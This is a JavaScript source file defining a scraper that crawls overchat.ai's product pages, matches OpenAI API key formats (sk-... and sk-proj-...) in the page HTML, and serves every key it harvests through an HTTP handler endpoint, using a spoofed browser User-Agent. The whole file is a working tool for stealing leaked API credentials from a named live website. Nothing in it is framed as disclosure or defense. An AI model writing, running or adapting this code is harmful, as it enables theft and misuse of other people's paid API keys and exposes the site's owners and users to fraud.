import axios from "axios";
import * as cheerio from "cheerio";
const API_KEY_REGEX = /(sk-[a-zA-Z0-9]{20,50}T3BlbkFJ[a-zA-Z0-9]{20,50}|sk-proj-[a-zA-Z0-9]{32,})/gi;
const BASE_URL = "https://overchat.ai";
const CONCURRENCY_LIMIT = 10;
const REQUEST_TIMEOUT = 8e3;
export class OverchatKeyExtractor {
  constructor() {
    this.keys = new Set();
    this.pages = new Set();
  }
  async scan() {
    try {
      await this.getProductLinks();
      await this.scanAllPages();
      return {
        keys: [...this.keys]
      };
    } catch (error) {
      console.error("Scan failed:", error.message);
      return {
        keys: [...this.keys],
        error: error.message
      };
    }
  }
  async getProductLinks() {
    try {
      const html = await this.fetch(BASE_URL);
      const $ = cheerio.load(html);
      $('div.footer_s_block a[href^="/"]').each((_, el) => {
        const href = $(el).attr("href");
        if (href && !href.startsWith("/legal") && !href.includes("#")) {
          this.pages.add(`${BASE_URL}${href}`);
        }
      });
    } catch (error) {
      console.error("Failed to get product links:", error.message);
      throw error;
    }
  }
  async scanAllPages() {
    const pages = [...this.pages];
    for (let i = 0; i < pages.length; i += CONCURRENCY_LIMIT) {
      const batch = pages.slice(i, i + CONCURRENCY_LIMIT);
      await Promise.allSettled(batch.map(url => this.scanPage(url).catch(e => console.error(`Error scanning ${url}:`, e.message))));
      await new Promise(resolve => setTimeout(resolve, 300));
    }
  }
  async scanPage(url) {
    try {
      const html = await this.fetch(url);
      const matches = html.match(API_KEY_REGEX);
      if (matches) {
        matches.forEach(key => this.keys.add(key));
      }
    } catch (error) {
      console.error(`Failed to scan ${url}:`, error.message);
    }
  }
  async fetch(url) {
    try {
      const {
        data
      } = await axios.get(url, {
        headers: {
          "User-Agent": "Mozilla/5.0",
          Accept: "text/html"
        },
        timeout: REQUEST_TIMEOUT
      });
      return data;
    } catch (error) {
      throw new Error(`Failed to fetch ${url}: ${error.message}`);
    }
  }
}
export default async function handler(req, res) {
  try {
    const extractor = new OverchatKeyExtractor();
    const result = await extractor.scan();
    return res.status(200).json(result);
  } catch (error) {
    res.status(500).json({
      error: error.message || "Internal Server Error"
    });
  }
}